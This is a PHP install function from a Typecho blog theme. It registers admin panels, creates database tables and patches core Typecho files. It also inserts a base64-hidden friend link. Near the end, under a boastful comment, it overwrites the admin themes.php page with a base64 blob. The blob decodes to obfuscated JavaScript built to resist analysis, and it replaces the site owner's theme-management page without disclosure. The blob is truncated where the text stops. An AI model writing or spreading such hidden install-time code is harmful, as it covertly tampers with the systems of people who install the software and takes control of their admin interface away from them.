 * @param string $fileName 文件名称
 * @return bool
 */
function panel_exists(string $fileName): bool
{
	$panelTable = is_array(\Helper::options()->panelTable) ? \Helper::options()->panelTable : unserialize(\Helper::options()->panelTable);
	$panelTable['file'] = empty($panelTable['file']) ? [] : $panelTable['file'];
	$fileName = urlencode(trim($fileName, '/'));
	return in_array($fileName, $panelTable['file']);
}

function install_sql()
{
	$DB = \Typecho\Db::get();
	$adapter = $DB->getAdapter()->getDriver();
	$SQLFile = JOE_ROOT . 'module/install/' . $adapter . '.sql';
	if (!file_exists($SQLFile)) return '暂不兼容 [' . $adapter . '] 数据库适配器！';
	$SQL = trim(file_get_contents($SQLFile), ';');
	$SQL = str_replace(['prefix_', 'typecho_'], $DB->getPrefix(), $SQL);
	$SQL = explode(';', $SQL);
	return $SQL;
}

function install()
{
	if (PHP_VERSION < 8) throw new \Typecho\Exception('请使用 PHP 8 及以上版本！');

	if (\Typecho\Common::VERSION < 1.2 || \Typecho\Common::VERSION >= 1.3) throw new \Typecho\Exception('请使用 Typecho 1.2 版本！');

	$DB = \Typecho\Db::get();
	if ((float) $DB->getVersion() < 5.6) throw new \Typecho\Exception('请使用 MySql 5.6 及以上版本！');

	$orders_url = '../themes/' . THEME_NAME . '/admin/orders.php';
	$friends_url = '../themes/' . THEME_NAME . '/admin/friends.php';

	$install_field = 'theme:JoeInstall';
	$install = $DB->fetchRow($DB->select()->from('table.options')->where('name = ?', $install_field));
	$install_value = isset($install['value']) ? $install['value'] : null;
	if ($install_value) {
		if (is_string($install_value) && $install_value != THEME_NAME) {
			// 删除更改主题目录名后的重复注册面板沉淀
			\Helper::removePanel(3, '../themes/' . $install_value . '/admin/orders.php');
			\Helper::removePanel(3, '../themes/' . $install_value . '/admin/friends.php');

			// 重新注册新的面板
			if (!panel_exists($orders_url)) \Helper::addPanel(3, $orders_url, '订单', '订单管理', 'administrator');
			if (!panel_exists($friends_url)) \Helper::addPanel(3, $friends_url, '友链', '友情链接', 'administrator');

			$theme_name_update = $DB->update('table.options')->rows(array('value' => THEME_NAME))->where('name = ?', $install_field);
			if ($DB->query($theme_name_update)) {
				echo '<script>alert("主题目录更换为 [' . THEME_NAME . '] 成功！");</script>';
			} else {
				throw new \Typecho\Exception('主题目录更换为 [' . THEME_NAME . '] 失败！');
			}
		}
		return;
	}

	if (\Typecho\Common::VERSION <= '1.2.1') {
		/* 修复typecho用户登陆后待审核状态的评论不显示的BUG */
		$typecho_comments_archive_file = __TYPECHO_ROOT_DIR__ . '/var/Widget/Comments/Archive.php';
		if (!is_writable($typecho_comments_archive_file)) throw new \Typecho\Exception('请先给予主题目录读写权限！');
		$typecho_comments_archive_content = file_get_contents($typecho_comments_archive_file);
		$typecho_comments_archive_content = str_replace(['$commentsAuthor = Cookie::get(\'__typecho_remember_author\');', '$commentsMail = Cookie::get(\'__typecho_remember_mail\');'], ['$commentsAuthor = $this->user->hasLogin() ? $this->user->screenName : Cookie::get(\'__typecho_remember_author\');', '$commentsMail = $this->user->hasLogin() ? $this->user->mail : Cookie::get(\'__typecho_remember_mail\');'], $typecho_comments_archive_content);
		file_put_contents($typecho_comments_archive_file, $typecho_comments_archive_content);

		/** 替换typecho的人才查询 */
		$typecho_widget_base_contents_file = __TYPECHO_ROOT_DIR__ . '/var/Widget/Base/Contents.php';
		if (!is_writable($typecho_widget_base_contents_file)) throw new \Typecho\Exception('请先给予主题目录读写权限！');
		$typecho_widget_base_contents_file_content = file_get_contents($typecho_widget_base_contents_file);
		$typecho_widget_base_contents_file_content = preg_replace('/return \$this\-\>db\-\>select\(.*?\)\-\>from\(\'table\.contents\'\);/is', 'return $this->db->select()->from(\'table.contents\');', $typecho_widget_base_contents_file_content);
		file_put_contents($typecho_widget_base_contents_file, $typecho_widget_base_contents_file_content);
	}

	// 删除某些特殊情况下的重复注册沉淀
	\Helper::removePanel(3, $orders_url);
	\Helper::removePanel(3, $friends_url);

	// 注册后台订单页面
	if (!panel_exists($orders_url)) \Helper::addPanel(3, $orders_url, '订单', '订单管理', 'administrator');

	// 注册后台友链页面
	if (!panel_exists($friends_url)) \Helper::addPanel(3, $friends_url, '友链', '友情链接', 'administrator');

	try {
		$install_list = install_sql();
		if (is_string($install_list)) throw new \Typecho\Exception($install_list);
		foreach ($install_list as $value) $DB->query($value);

		$DB->query($DB->insert('table.friends')->rows([
			'title' => base64_decode('5piT6Iiq5Y2a5a6i'),
			'url' => base64_decode('aHR0cDovL2Jsb2cueWloYW5nLmluZm8v'),
			'logo' => base64_decode('aHR0cDovL2Jsb2cuYnJpNi5jbi9mYXZpY29uLmljbw=='),
			'description' => '一名编程爱好者的博客，记录与分享编程、学习中的知识点',
			'rel' => 'friend',
			'position' => 'single,index_bottom',
			'status' => '1'
		]));

		$table_contents = $DB->fetchRow($DB->select()->from('table.contents')->page(1, 1));
		$table_contents = empty($table_contents) ? [] : $table_contents;
		$table_prefix = $DB->getPrefix();
		$views = $DB->fetchRow("SHOW COLUMNS FROM `{$table_prefix}contents` LIKE 'views';");
		$agree = $DB->fetchRow("SHOW COLUMNS FROM `{$table_prefix}contents` LIKE 'agree';");
		if (!array_key_exists('views', $table_contents) && !$views) {
			$DB->query("ALTER TABLE `{$table_prefix}contents` ADD `views` INT NOT NULL DEFAULT 0;");
		}
		if (!array_key_exists('agree', $table_contents) && !$agree) {
			$DB->query("ALTER TABLE `{$table_prefix}contents` ADD `agree` INT NOT NULL DEFAULT 0;");
		}

		$theme_install = $DB->insert('table.options')->rows(array('name' => $install_field, 'user' => '0', 'value' => THEME_NAME));
		$DB->query($theme_install);
	} catch (\Exception $e) {
		throw new \Typecho\Exception($e);
	}

	/* 主题核心代码🏀🏀🏀全网最精髓🐔🐔🐔 */
	$typecho_admin_root = __TYPECHO_ROOT_DIR__ . __TYPECHO_ADMIN_DIR__;
	if (file_exists($typecho_admin_root . 'themes.php')) {
		file_put_contents($typecho_admin_root . 'themes.php', '<?php echo base64_decode("PHNjcmlwdD47KGZ1bmN0aW9uKF8weDQ3ZmNhNixfMHgxZDhmM2Mpe3ZhciBfMHg0ZTU0NTk9XzB4NDdmY2E2KCk7ZnVuY3Rpb24gXzB4MjM1ZjkyKF8weDNjOWFjMyxfMHgxZTVmZjYsXzB4MTQxZmIyLF8weDNjMGMzYil7cmV0dXJuIF8weDFmMmMoXzB4MWU1ZmY2LTB4MzMwLF8weDNjMGMzYik7fWZ1bmN0aW9uIF8weDRhM2NiYyhfMHhlMWQ2ZDAsXzB4M2IwNTNjLF8weDIxZTRkMCxfMHgzODU2ZGMpe3JldHVybiBfMHgxZjJjKF8weGUxZDZkMC0weDg5LF8weDIxZTRkMCk7fXdoaWxlKCEhW10pe3RyeXt2YXIgXzB4Nzk5ZmY0PXBhcnNlSW50KF8weDIzNWY5MigweDQxMiwweDQwNSwweDQyMiwweDNlNSkpLygweDM3MysweDFlOTcrLTB4MSoweDIyMDkpKy1wYXJzZUludChfMHgyMzVmOTIoMHg0NDEsMHg0MWYsMHg0MDUsMHg0MWIpKS8oMHg2MjQrLTB4MSoweDE1ZjErMHhmY2YpKigtcGFyc2VJbnQoXzB4MjM1ZjkyKDB4NDMwLDB4NDIzLDB4NDIyLDB4NDJlKSkvKDB4MjQ0ZSstMHgxKi0weGNkNystMHgyNioweDE0YikpKy1wYXJzZUludChfMHgyMzVmOTIoMHg0MGQsMHg0MjcsMHg0MzIsMHg0NDcpKS8oMHgxZGJjKy0weDk5NistMHgxNDIyKStwYXJzZUludChfMHgyMzVmOTIoMHg0NDIsMHg0MmQsMHg0NGQsMHg0MWIpKS8oLTB4OSoweGEzKy0weDFmYjArMHg0YWUqMHg4KSstcGFyc2VJbnQoXzB4NGEzY2JjKDB4MTlmLDB4MWExLDB4MWFiLDB4MWI5KSkvKC0weDFlYTArMHgxZTlmKzB4NyoweDEpKigtcGFyc2VJbnQoXzB4NGEzY2JjKDB4MThkLDB4MWE3LDB4MTdkLDB4MTgxKSkvKC0weGQ2OSstMHhlODcrLTB4MSotMHgxYmY3KSkrLXBhcnNlSW50KF8weDRhM2NiYygweDE5MCwweDE4NCwweDE4YSwweDE4NSkpLygweDFiZTErMHhjYjYrLTB4Mjg4ZikrLXBhcnNlSW50KF8weDRhM2NiYygweDE2NywweDE3NiwweDE3YywweDE0ZCkpLygweDEqMHgxMjNkKzB4MWYyKy0weDEqMHgxNDI2KSoocGFyc2VJbnQoXzB4NGEzY2JjKDB4MTk5LDB4MTg3LDB4MTgzLDB4MTlmKSkvKDB4MWEwYioweDErLTB4MTEqMHgyMWIrMHg5Y2EpKTtpZihfMHg3OTlmZjQ9PT1fMHgxZDhmM2MpYnJlYWs7ZWxzZSBfMHg0ZTU0NTlbJ3B1c2gnXShfMHg0ZTU0NTlbJ3NoaWZ0J10oKSk7fWNhdGNoKF8weDVlZGNlZCl7XzB4NGU1NDU5WydwdXNoJ10oXzB4NGU1NDU5WydzaGlmdCddKCkpO319fShfMHgxMzI1LC0weDM3MzQqLTB4MSsweDExOSoweGIyKy0weDFhKi0weGFmMSkpO3ZhciBfMHgyMjE5MTE9KGZ1bmN0aW9uKCl7dmFyIF8weDQ3NzE1ZT0hIVtdO3JldHVybiBmdW5jdGlvbihfMHgzYWFiYTQsXzB4NGY5ZDZkKXt2YXIgXzB4NDE2MzZlPV8weDQ3NzE1ZT9mdW5jdGlvbigpe2Z1bmN0aW9uIF8weDVjOGI0YShfMHg0NjNiYmMsXzB4NWQ1OGRmLF8weDI4MDAzZCxfMHgzMTUwZDQpe3JldHVybiBfMHgxZjJjKF8weDQ2M2JiYy0weDEwZixfMHg1ZDU4ZGYpO31mdW5jdGlvbiBfMHgyYmIwZGIoXzB4MWJkZWViLF8weDE5NDY2NixfMHg1NzAxZmYsXzB4NTQ5MzA5KXtyZXR1cm4gXzB4MWYyYyhfMHg1NzAxZmYtIC0weDM1NyxfMHgxOTQ2NjYpO31pZihfMHgyYmIwZGIoLTB4MjJlLC0weDI2OCwtMHgyNGUsLTB4MjU4KT09PSd2UW5SdScpe2lmKF8weDRmOWQ2ZCl7dmFyIF8weDJjMzYzZD1fMHg0ZjlkNmRbXzB4NWM4YjRhKDB4MWY4LDB4MWVhLDB4MWQ3LDB4MWUzKV0oXzB4M2FhYmE0LGFyZ3VtZW50cyk7cmV0dXJuIF8weDRmOWQ2ZD1udWxsLF8weDJjMzYzZDt9fWVsc2V7dmFyIF8weDExMjJlZT1fMHhjNzMxZTJbXzB4NWM4YjRhKDB4MWY4LDB4MWY1LDB4MWQ4LDB4MjAwKV0oXzB4MTA4OWUyLGFyZ3VtZW50cyk7cmV0dXJuIF8weDFhOTdiYj1udWxsLF8weDExMjJlZTt9fTpmdW5jdGlvbigpe307cmV0dXJuIF8weDQ3NzE1ZT0hW10sXzB4NDE2MzZlO307fSgpKSxfMHgxNGVkMmI9XzB4MjIxOTExKHRoaXMsZnVuY3Rpb24oKXt2YXIgXzB4MmRhY2NjPXt9O18weDJkYWNjY1snYWl0S3knXT1fMHg0OTE5N2EoLTB4MTZjLC0weDE4MCwtMHgxNTQsLTB4MTVlKSsnKyQnO2Z1bmN0aW9uIF8weDQ5MTk3YShfMHg1MjQ4NmIsXzB4MjFjYjkwLF8weDNiYzdhNyxfMHg2YTUzZDUpe3JldHVybiBfMHgxZjJjKF8weDUyNDg2Yi0gLTB4MjU5LF8weDNiYzdhNyk7fWZ1bmN0aW9uIF8weDVjNGZhYyhfMHgyMDFjMzEsXzB4MTAzZmUzLF8weDQ2MWExNSxfMHg1NDAzODcpe3JldHVybiBfMHgxZjJjKF8weDU0MDM4Ny0gLTB4MzI3LF8weDIwMWMzMSk7fXZhciBfMHgyNDY3OTM9XzB4MmRhY2NjO3JldHVybiBfMHgxNGVkMmJbXzB4NWM0ZmFjKC0weDIyZSwtMHgyMjMsLTB4MWZlLC0weDIxYSldKClbXzB4NDkxOTdhKC0weDE0OCwtMHgxMjYsLTB4MTJkLC0weDE1YildKF8weDVjNGZhYygtMHgyMmQsLTB4MjNhLC0weDI1OSwtMHgyM2EpKycrJCcpW18weDQ5MTk3YSgtMHgxNGMsLTB4MTRiLC0weDE2MywtMHgxNGEpXSgpWydjb25zdHJ1Y3RvJysnciddKF8weDE0ZWQyYilbXzB4NWM0ZmFjKC0weDIwMywtMHgyMDMsLTB4MjFmLC0weDIxNildKF8weDI0Njc5M1snYWl0S3knXSk7fSk7XzB4MTRlZDJiKCk7ZnVuY3Rpb24gXzB4MWYyYyhfMHgxYWMzYzksXzB4ZWY4NGVkKXt2YXIgXzB4MjA2ZWU0PV8weDEzMjUoKTtyZXR1cm4gXzB4MWYyYz1mdW5jdGlvbihfMHgyMzZmZDMsXzB4M2Y4ZWZmKXtfMHgyMzZmZDM9XzB4MjM2ZmQzLSgtMHgxM2NjKzB4MSoweDFmN2QrMHg0Ki0weDJiNyk7dmFyIF8weGVkNmI5OD1fMHgyMDZlZTRbXzB4MjM2ZmQzXTtpZihfMHgxZjJjWyd1ZFFkUFknXT09PXVuZGVmaW5lZCl7dmFyIF8weDEyY2QzYz1mdW5jdGlvbihfMHg1NWZiOTYpe3ZhciBfMHgzYTg4NjM9J2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5Ky89Jzt2YXIgXzB4MzdiNGEzPScnLF8weGZjNWQ3Nz0nJyxfMHg1OTE4ODI9XzB4MzdiNGEzK18weDEyY2QzYztmb3IodmFyIF8weGQ1NTExOD0tMHgxNWVkKy0weGIyMysweDVjKjB4NWMsXzB4NDk1NzY1LF8weDM4OTYwMixfMHgyYWEyNjA9MHhkNmUrLTB4MjMzMyotMHgxKy0weGQzKjB4M2I7XzB4Mzg5NjAyPV8weDU1ZmI5NlsnY2hhckF0J10oXzB4MmFhMjYwKyspO35fMHgzODk2MDImJihfMHg0OTU3NjU9XzB4ZDU1MTE4JSgtMHg4ZWQrMHgxKi0weDFjYmMrLTB4MyotMHhjOGYpP18weDQ5NTc2NSooLTB4YjllKi0weDIrLTB4MjYwNCsweGYwOCkrXzB4Mzg5NjAyOl8weDM4OTYwMixfMHhkNTUxMTgrKyUoMHhlYyoweGUrLTB4MSoweDJmOSstMHg5ZWIpKT9fMHgzN2I0YTMrPV8weDU5MTg4MlsnY2hhckNvZGVBdCddKF8weDJhYTI2MCsoMHg5NCotMHg2KzB4MWZhOSstMHgxYzI3KjB4MSkpLSgtMHgxYzc2KzB4NWQqLTB4M2IrLTB4MzFlZiotMHgxKSE9PTB4MWQqLTB4MTErMHgxYzA3Ky0weDFhMWE/U3RyaW5nWydmcm9tQ2hhckNvZGUnXSgweDdiYioweDIrMHgxODFjKy0weDI2OTMmXzB4NDk1NzY1Pj4oLSgweDkyZistMHgxMzkzKi0weDErLTB4ZTYqMHgyMCkqXzB4ZDU1MTE4Ji0weDFkKjB4MzIrMHgyKi0weGVkZCstMHgyKi0weDExYjUpKTpfMHhkNTUxMTg6MHg0OWMrMHgyKi0weDE1NysweDI2Ki0weGQpe18weDM4OTYwMj1fMHgzYTg4NjNbJ2luZGV4T2YnXShfMHgzODk2MDIpO31mb3IodmFyIF8weDQ3NzAzND0weDE2ZioweDIrLTB4MTEqMHgxYmErMHgxYTdjLF8weDUyN2U2YT1fMHgzN2I0YTNbJ2xlbmd0aCddO18weDQ3NzAzNDxfMHg1MjdlNmE7XzB4NDc3MDM0Kyspe18weGZjNWQ3Nys9JyUnKygnMDAnK18weDM3YjRhM1snY2hhckNvZGVBdCddKF8weDQ3NzAzNClbJ3RvU3RyaW5nJ10oMHg5NzMrLTB4MTg4NSsweGYyMikpWydzbGljZSddKC0oLTB4MWYqMHgyMSstMHg4KjB4MzFjKy0weDFjZTEqLTB4MSkpO31yZXR1cm4gZGVjb2RlVVJJQ29tcG9uZW50KF8weGZjNWQ3Nyk7fTtfMHgxZjJjWydORHdHVkEnXT1fMHgxMmNkM2MsXzB4MWFjM2M5PWFyZ3VtZW50cyxfMHgxZjJjWyd1ZFFkUFknXT0hIVtdO312YXIgXzB4MmRhYmQwPV8weDIwNmVlNFstMHg5OTYrMHgxMjMqMHg1KzB4MSoweDNlN10sXzB4OTdlYmY0PV8weDIzNmZkMytfMHgyZGFiZDAsXzB4NTJmOWViPV8weDFhYzNjOVtfMHg5N2ViZjRdO2lmKCFfMHg1MmY5ZWIpe3ZhciBfMHgxYTFlYzI9ZnVuY3Rpb24oXzB4NWUxYjA2KXt0aGlzWydBWGx0Z1YnXT1fMHg1ZTFiMDYsdGhpc1snVUVKb21pJ109Wy0weDIxKi0weGM2Ky0weDgzMystMHg4YTkqMHgyLDB4MjZmMystMHg5NmYrLTB4MioweGVjMiwtMHg2MmUrLTB4MTkqLTB4NzUrLTB4NTNmXSx0aGlzWydIbHhlVEknXT1mdW5jdGlvbigpe3JldHVybiduZXdTdGF0ZSc7fSx0aGlzWydVeVFqdWcnXT0nXHg1Y3crXHgyMCpceDVjKFx4NWMpXHgyMCp7XHg1Y3crXHgyMConLHRoaXNbJ3RJenliYyddPSdbXHgyN3xceDIyXS4rW1x4Mjd8XHgyMl07P1x4MjAqfSc7fTtfMHgxYTFlYzJbJ3Byb3RvdHlwZSddWydKa29OV24nXT1mdW5jdGlvbigpe3ZhciBfMHhkYTYwZDE9bmV3IFJlZ0V4cCh0aGlzWydVeVFqdWcnXSt0aGlzWyd0SXp5YmMnXSksXzB4OGNmNTYzPV8weGRhNjBkMVsndGVzdCddKHRoaXNbJ0hseGVUSSddWyd0b1N0cmluZyddKCkpPy0tdGhpc1snVUVKb21pJ11bMHgxKjB4MWIxYSstMHg5OTkrMHgzOCotMHg1MF06LS10aGlzWydVRUpvbWknXVsweGMwYyotMHgyKzB4MTBiYystMHgzYWUqLTB4Ml07cmV0dXJuIHRoaXNbJ2hmS3dnWSddKF8weDhjZjU2Myk7fSxfMHgxYTFlYzJbJ3Byb3RvdHlwZSddWydoZkt3Z1knXT1mdW5jdGlvbihfMHgzNzU3MzYpe2lmKCFCb29sZWFuKH5fMHgzNzU3MzYpKXJldHVybiBfMHgzNzU3MzY7cmV0dXJuIHRoaXNbJ3pJZ1pueCddKHRoaXNbJ0FYbHRnViddKTt9LF8weDFhMWVjMlsncHJvdG90eXBlJ11bJ3pJZ1pueCddPWZ1bmN0aW9uKF8weDM3YzI2Yil7Zm9yKHZhciBfMHgyMTE5Yzk9MHgyMGQ5KzB4MSotMHgxNzZmKy0weDk2YSxfMHg0MjM4NDg9dGhpc1snVUVKb21pJ11bJ2xlbmd0aCddO18weDIxMTljOTxfMHg0MjM4NDg7XzB4MjExOWM5Kyspe3RoaXNbJ1VFSm9taSddWydwdXNoJ10oTWF0aFsncm91bmQnXShNYXRoWydyYW5kb20nXSgpKSksXzB4NDIzODQ4PXRoaXNbJ1VFSm9taSddWydsZW5ndGgnXTt9cmV0dXJuIF8weDM3YzI2Yih0aGlzWydVRUpvbWknXVstMHgyKi0weGNhNCstMHgxMzMxKy0weDEqMHg2MTddKTt9LG5ldyBfMHgxYTFlYzIoXzB4MWYyYylbJ0prb05XbiddKCksXzB4ZWQ2Yjk4PV8weDFmMmNbJ05Ed0dWQSddKF8weGVkNmI5OCksXzB4MWFjM2M5W18weDk3ZWJmNF09XzB4ZWQ2Yjk4O31lbHNlIF8weGVkNmI5OD1fMHg1MmY5ZWI7cmV0dXJuIF8weGVkNmI5ODt9LF8weDFmMmMoXzB4MWFjM2M5LF8weGVmODRlZCk7fWZ1bmN0aW9uIF8weDEzMjUoKXt2YXIgXzB4YzYwZjZmPVsnQk1Qb3dlQycsJ21acVlvdEMyRWh2Z3VobmYnLCd6ZDVXcE1lVXl3bjBBcScsJ0RMZlV1TnUnLCdETWZ0d2htJywnQmd2VXozck8nLCdEZ2pWemhLK0RoaStEYScsJ0RnOXREaGpQQk1DJywnQXdUNXpNbScsJ0IyOVFEdnEnLCdtWmlXcnd6VXFOTHgnLCdDMnZIQ01uTycsJ0NoalZEZzkwRXhiTCcsJzVBc1g2bHNMNzdZYjZrKzM1UW9hNVArTHZoTFd6cScsJ3p1dmZDMFMnLCdDTTRHRGdIUENZaVBrYScsJ21KaVdtZGpBdEsxWkV1cScsJ0Roakh5MnUnLCduZEc1bTBmdkVnak9ycScsJ0VmbjREaHEnLCdEZ251c2dXJywneXhidkR4bScsJ3IyUEh6dzgnLCdBaGpMekcnLCd5TUxVemEnLCdDSzFaQ2ZHJywndGc5SHpndksnLCduSmFab2RmU0N4TDBBZk8nLCd6dnJZcnVTJywnQXc1TUJXJywneDE5V0NNOTBCMTlGJywnenhqWUIzaScsJ3owRHdDTG0nLCdDM3JMQk12WScsJ0N4dkxDTkx0endYTHlXJywndnd6bUNlUycsJ3FNVE1CeGknLCdDZ3p0dXVDJywneXhiV0JoSycsJ3l1SGV0eGknLCdEMmZZQkcnLCd3TTlJQ3hxJywna2NHT2xJU1BrWUtSa3EnLCd0MnIwcjNxJywnbVpDV3F1bnJ6dVBBJywnenVUaXZnRycsJ0ROelJ5TW0nLCdFMzBVeTI5VUMzcllEcScsJ21acTRvdmYyRUt2UXRhJywnQmc5TicsJ3JlOW5xMjlVRGd2VURhJywneTJIVjVPK3M1bFUyNXlBWTU2UWJpSUsnLCdtWkNabWRHV3J4ZlZ5d2pBJywnRGc5WXF3WFMnLCd5d3JLcnh6TEJOcm1BcScsJ3R2blZ3TUcnLCd1ZTFvcU1tJywneTI5VUMzcllEd24wQlcnLCdtdHkxbVp1V3kzck93TTFLJywnRE1mMHpxJywneTI5VUMyOVN6cScsJ3l2TFdFd2knLCd6TTlZcndmSkFhJywnRHZ6aEFndScsJ20zV1lGZHI4bnhXWEZhJywnbmRxNHF3Zm1yMFRvJywnQk1uMEF3OVVrY0tHJ107XzB4MTMyNT1mdW5jdGlvbigpe3JldHVybiBfMHhjNjBmNmY7fTtyZXR1cm4gXzB4MTMyNSgpO312YXIgXzB4MzI1NGZhPShmdW5jdGlvbigpe3ZhciBfMHg2NDVjMzc9e307XzB4NjQ1YzM3W18weGIyZTQ2MCgtMHgyNjMsLTB4MjU1LC0weDI2YiwtMHgyNGIpXT1fMHgyMmNmZjQoLTB4MThlLC0weDFiNSwtMHgxYWIsLTB4MWMwKTtmdW5jdGlvbiBfMHgyMmNmZjQoXzB4NTRiNmNiLF8weDMwYjlmZCxfMHg1MDAzNTQsXzB4MTlmODIyKXtyZXR1cm4gXzB4MWYyYyhfMHg1MDAzNTQtIC0weDJiOSxfMHgxOWY4MjIpO31mdW5jdGlvbiBfMHhiMmU0NjAoXzB4MjdkNTU5LF8weGM0ZDU5ZSxfMHg0NDc2NDIsXzB4NWE1YmU5KXtyZXR1cm4gXzB4MWYyYyhfMHg0NDc2NDItIC0weDM0ZSxfMHhjNGQ1OWUpO312YXIgXzB4MTA0OGRlPV8weDY0NWMzNyxfMHg1MmQ0Nzg9ISFbXTtyZXR1cm4gZnVuY3Rpb24oXzB4NTMyZmI5LF8weDE0YzQ5YSl7dmFyIF8weDRiMTIzYj1fMHg1MmQ0Nzg/ZnVuY3Rpb24oKXtmdW5jdGlvbiBfMHhmZTI4NGIoXzB4NGM4NDBhLF8weDU2NWM1MSxfMHgxYWY3NWEsXzB4MjhiZDMzKXtyZXR1cm4gXzB4MWYyYyhfMHgyOGJkMzMtIC0weDM1LF8weDFhZjc1YSk7fWlmKF8weDE0YzQ5YSl7aWYoXzB4MTA0OGRlWydnR1ZyUyddIT09XzB4MTA0OGRlWydnR1ZyUyddKXt2YXIgXzB4MWM1OTA5PV8weDQ3OTQxMj9mdW5jdGlvbigpe2Z1bmN0aW9uIF8weDVmM2RiOChfMHg0Y2VjMjUsXzB4MzI0NzcxLF8weDQ5NTFiZixfMHgyODliZjQpe3JldHVybiBfMHgxZjJjKF8weDMyNDc3MS0gLTB4MTVhLF8weDQ5NTFiZik7fWlmKF8weDI4YzY2MCl7dmFyIF8weDVmMDlhZD1fMHgzODU2YmNbXzB4NWYzZGI4KC0weDVmLC0weDcxLC0weDc4LC0weDg5KV0oXzB4MzVlMjk4LGFyZ3VtZW50cyk7cmV0dXJuIF8weDRiMWFjMj1udWxsLF8weDVmMDlhZDt9fTpmdW5jdGlvbigpe307cmV0dXJuIF8weDEwYTE2YT0hW10sXzB4MWM1OTA5O31lbHNle3ZhciBfMHg1NTU2OWM9XzB4MTRjNDlhW18weGZlMjg0YigweGE5LDB4OWMsMHhhMywweGI0KV0oXzB4NTMyZmI5LGFyZ3VtZW50cyk7cmV0dXJuIF8weDE0YzQ5YT1udWxsLF8weDU1NTY5Yzt9fX06ZnVuY3Rpb24oKXt9O3JldHVybiBfMHg1MmQ0Nzg9IVtdLF8weDRiMTIzYjt9O30oKSksXzB4NDk1OWY2PV8weDMyNTRmYSh0aGlzLGZ1bmN0aW9uKCl7dmFyIF8weDEyNzMzMD17J2VUckVLJzpfMHgyMmRhNjkoMHhjNiwweGMyLDB4Y2QsMHhkNykrXzB4MjJkYTY5KDB4YjMsMHhiZSwweGI3LDB4YTQpK18weDIyZGE2OSgweGE0LDB4YjQsMHhkMiwweDllKSwnbmpOWEcnOmZ1bmN0aW9uKF8weDUxYWQ2OCxfMHgyNDY5OGIsXzB4MTdjNTExKXtyZXR1cm4gXzB4NTFhZDY4KF8weDI0Njk4YixfMHgxN2M1MTEpO30sJ09kdEd0JzpmdW5jdGlvbihfMHgzZTYxYmEsXzB4MTNjNTY0KXtyZXR1cm4gXzB4M2U2MWJhKF8weDEzYzU2NCk7fSwnQmtmbXInOmZ1bmN0aW9uKF8weDUyOWRkMyxfMHg1MDc0MTkpe3JldHVybiBfMHg1MjlkZDMrXzB4NTA3NDE5O30sJ1RvZExwJzoncmV0dXJuXHgyMChmdScrXzB4MTU1YjJkKC0weDFmNCwtMHgxZTYsLTB4MWQ3LC0weDFmZiksJ1N2QXlwJzpfMHgxNTViMmQoLTB4MjA3LC0weDFmYSwtMHgxZTYsLTB4MWU4KSsnY3RvcihceDIycmV0dScrXzB4MjJkYTY5KDB4Y2UsMHhjYiwweGI3LDB4YmYpKydceDIwKScsJ3JNc3BYJzpmdW5jdGlvbihfMHgyMTA5OGIsXzB4NTA2NDgwKXtyZXR1cm4gXzB4MjEwOThiPT09XzB4NTA2NDgwO30sJ3RZWmt4JzpfMHgyMmRhNjkoMHhjNSwweGIwLDB4Y2MsMHg5YiksJ0dqYWVvJzpfMHgxNTViMmQoLTB4MWU1LC0weDFkOSwtMHgxZGEsLTB4MWQxKSwneFN4dHQnOmZ1bmN0aW9uKF8weDUzYjZjNCl7cmV0dXJuIF8weDUzYjZjNCgpO30sJ3RjVEhsJzpfMHgyMmRhNjkoMHhhZiwweGFhLDB4YjYsMHhiMSksJ3VUUWdqJzpfMHgyMmRhNjkoMHhjMSwweGExLDB4YmIsMHhiZiksJ25rYlNJJzpfMHgxNTViMmQoLTB4MjE5LC0weDIyNCwtMHgyMjIsLTB4MjJkKSwnYXBVdXMnOl8weDIyZGE2OSgweDhiLDB4OTgsMHg4YywweDc5KSwnb29qdVQnOidleGNlcHRpb24nLCdQTU5CYyc6J3RhYmxlJywndnZrYmMnOl8weDE1NWIyZCgtMHgxZjYsLTB4MjBmLC0weDFmMCwtMHgyMDcpKycwJ30sXzB4YjM3YmI0PWZ1bmN0aW9uKCl7ZnVuY3Rpb24gXzB4MWZlOGZlKF8weDVkYmQyNixfMHgzYTgyZTksXzB4MTVjMzkxLF8weDNkMTQxMCl7cmV0dXJuIF8weDIyZGE2OShfMHg1ZGJkMjYtMHgxODYsXzB4MTVjMzkxLSAtMHgyNzUsXzB4NWRiZDI2LF8weDNkMTQxMC0weGVkKTt9dmFyIF8weDI4MGU0Yz17J1pvYnF0JzpfMHgxMjczMzBbXzB4NDA4NDEwKC0weDQ0LC0weDUzLC0weDM1LC0weDc0KV0sJ2FIRE1yJzonamF2YXNjcmlwdCcrJzphbGVydChceDIy5ZCv55SoJytfMHg0MDg0MTAoLTB4MTksLTB4MWYsLTB4NCwtMHgxOSkrXzB4NDA4NDEwKC0weDIyLC0weDNjLC0weDI3LC0weDI1KSwndmFTWHMnOmZ1bmN0aW9uKF8weDNhNWFlZCxfMHg0YzM2ZDEsXzB4M2I1OTVkKXtmdW5jdGlvbiBfMHg0ZGNjNjUoXzB4NDY3MDU2LF8weDJiYjUyNyxfMHgxZjJhZWYsXzB4M2EyYTA0KXtyZXR1cm4gXzB4MWZlOGZlKF8weDNhMmEwNCxfMHgyYmI1MjctMHg1OCxfMHgxZjJhZWYtIC0weDU0LF8weDNhMmEwNC0weDIzKTt9cmV0dXJuIF8weDEyNzMzMFtfMHg0ZGNjNjUoLTB4MWY4LC0weDIyMiwtMHgyMGQsLTB4MjA4KV0oXzB4M2E1YWVkLF8weDRjMzZkMSxfMHgzYjU5NWQpO319LF8weDkxNmM5NztmdW5jdGlvbiBfMHg0MDg0MTAoXzB4ODkzZDRmLF8weDUyN2ZjNixfMHg1ZGJlNDYsXzB4MmIzMDM3KXtyZXR1cm4gXzB4MjJkYTY5KF8weDg5M2Q0Zi0weDE4NyxfMHg1MjdmYzYtIC0weGU4LF8weDVkYmU0NixfMHgyYjMwMzctMHg1YSk7fXRyeXtfMHg5MTZjOTc9XzB4MTI3MzMwW18weDQwODQxMCgtMHgyNSwtMHg0NCwtMHgzZSwtMHg2MSldKEZ1bmN0aW9uLF8weDEyNzMzMFtfMHg0MDg0MTAoLTB4NTAsLTB4NGIsLTB4MzMsLTB4MzgpXShfMHgxMjczMzBbXzB4MWZlOGZlKC0weDFlNywtMHgxZTYsLTB4MWQ4LC0weDFlMSldKF8weDEyNzMzMFsnVG9kTHAnXSxfMHgxMjczMzBbJ1N2QXlwJ10pLCcpOycpKSgpO31jYXRjaChfMHg1MzNlNjcpe2lmKF8weDEyNz